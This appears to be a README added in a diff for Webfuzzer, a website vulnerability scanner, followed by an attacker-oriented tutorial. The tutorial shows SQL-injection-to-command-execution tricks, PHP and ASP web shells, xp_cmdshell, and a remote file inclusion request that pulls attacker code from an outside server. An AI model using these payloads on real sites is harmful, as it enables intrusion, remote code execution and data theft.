@@ -1,0 +1,201 @@
+-------------------------------------------------------------------------
+ Webfuzzer (C) gunzip - http://gunzip.project-hack.org
+-------------------------------------------------------------------------
+
+This tool is written for automated discovering 
+of common vulnerabilities in websites.
+
+- directory traversal
+- cross site scripting
+- possible sql injection (asp)
+- remote execution through php includes
+- remote execution through unsafe perl open()
+- remote execution through shell escape meta-characters
+- users enumeration through ~home method
+
+---------
+  USAGE 
+---------
+
+Make your changes to technic.h and webfuzzer.h to add or toggle
+error codes or attack patterns, then type make to compile
+(or change Makefile to fit your suits)
+
+Examples of usage
+
+$ make
+$ ./webfuzzer -u www.example.com -o logfile.txt -sd
+$ ./webfuzzer -u http://www.example.com/dir/page.html -a # very noisy scan
+
+If you don't specify logfile then results go to log.<host>
+
+--------------------------------------
+  SQL INJECTION vs COMMAND EXECUTION
+--------------------------------------
+
+Many ppl ask me if you can execute commands once sql injection is possible.
+It depends on many things like the software used (asp or php ? mysql or 
+postgresql ? Microsoft Access, Jet engine or Microsoft Sql Server ?)
+
+There are some circumstances in which you can execute code.
+
+With MySql you can redirect the output of your query to a file like
+
+	SELECT * FROM table INTO OUTFILE "/path/to/file"
+
+but if the variable magic_quotes_gpc is set to On in php.ini
+(which it's usually the default configuration) 
+php will escape every ' or " so you can't use such technic.
+
+AFAIK there aren't many possibilities to execute code 
+in case you can inject sql in a system running MySQL + php.
+
+Moreover you can't execute multiple statement with php + mysql
+so a syntax like 
+
+	SELECT * FROM table; CREATE TABLE foo;
+
+it's not permitted (i think that it's not the same with postgresql)
+
+With PostgreSQL you can use 
+
+	COPY TABLE TO "file"
+
+while with MsSql you can try to exec the bcp program
+
+	bcp "SELECT * FROM TABLE" queryout 'c:\path\file'
+
+Once you gain the ability to write files into webservers directories
+you can create a table with some text content and redirect it to a file:
+
+with php you can create a file like 
+
+	<?php system($cmd) ?>
+
+with asp it's the same story
+
+	<%
+	set o = server.createobject("wscript.shell");
+	o.run( request.querystring("cmd") )
+	%>
+
+and finally with server side includes (.shtml)
+
+	<!--#exec cmd="/bin/ls" -->
+
+If Microsoft db lets you use stored procedures you can in some case use
+a syntax like
+
+	exec dbname..xp_cmdshell "dir" 
+
+to execute commands in the context of the user who owns the db
+(but this is a well known issue...)
+
+So there are multiple condition that have to be satisfied 
+which can lead to remote commands execution, in particular 
+
+the abilities to
+ 
+- redirect query output to files
+- execute multiple statement in one shot (rare) 
+- use of stored procedure (Microsoft Sql) 
+
+hint. It seems that there was a time when you could see ASP sources 
+
+- appending ::$DATA to the url  
+- addressing it with its DOS short name 
+- appending a single point to the url
+
+---------------------
+
+Two words about Microsoft SQL:
+
+There are some default databases and variables to play with:
+
+- master, model, tempdb, pubs, northwind
+- @@version, @@server
+
+On some sql engine running on Windows the statement
+delimiter is " GO " and not the semicolon ';' on others 
+(like the Jet engine) you can't execute more than one 
+query/statement at time (bad for us, good for them ;)
+
+-------------------------------------------
+  SQL INJECTION vs REMOTE FILE RETRIEVING
+-------------------------------------------
+
+The point here is simple: if you can load data from a file 
+(on the target system) to a table in the db you can see it with 
+
+	SELECT * FROM table (eventually redirecting output)
+
+The syntax looks different depending on the dbm:
+
+	MySql: LOAD DATA INFILE "file" INTO TABLE table
+
+	PostgreSQL: COPY table FROM "file"
+
+	MsSql: bulk insert tablename from 'c:\path\file'
+
+--------------------------------------------
+  PHP INCLUDE WARNING vs COMMAND EXECUTION
+--------------------------------------------
+
+What can be done once I get a php include error warning ?
+
+I think that many people can figure it out by themselves but for
+novices we can say that there are circumstances in which you can 
+inject your php code into the website space.
+
+If you get an error like
+
+<< Warning: Failed opening 'foo.php' for inclusion >>
+
+getting http://www.example.com/index.php?z=foo
+
+Then you can set up a malicios php file (read above)  
+on a webserver you control calling it evil.php then forge a request like 
+
+http://www.example.com/index.php?z=http://www.yourserver.com/evil?cmd=/bin/id
+
+In real life most of times there are restrictions on the file extension 
+or on the directory prefix so you can't inject any code, but in some of
+this situation you can read files on the attacked system with the
+permission of the user running the webserver
+
+http://www.example.com/index.php?z=../../../../../../path/file
+
+--------------
+  REFERENCES
+--------------
+
+http://www.securereality.com.au/studyinscarlet.txt
+http://www.securereality.com.au/archives/sradv00006.html
+http://b0iler.eyeonsecurity.org/tutorials/
+http://fravia.anticrack.de/marajasp.htm
+http://www.nextgenss.com/papers.html
+http://cobra.lucidx.com
+http://wpoison.sourceforge.net
+
+------------
+  COMMENTS
+------------
+
+Don't take this as an example of coding as it sucks,
+(like my english) particular on parsing and cpu/memory menagement.
+
+Please give right credits for bugs discovered with this.
+
+There's nothing new in here.
+
+AB14ckh4t fellows pardon me, but the original idea was to make this
+free public software as i'd like some feedback, i know it's not ethical :-D
+
+Misuse or abuse: I'll take no responsibility.
+
+If you're looking for something similar (better ?)
+take a look at the sf page of wpoison (great code)
+
+Tab width is 3 chars.
+
+Feedback, bugfixes, suggestion, ideas and flames to <techieone@softhome.net>
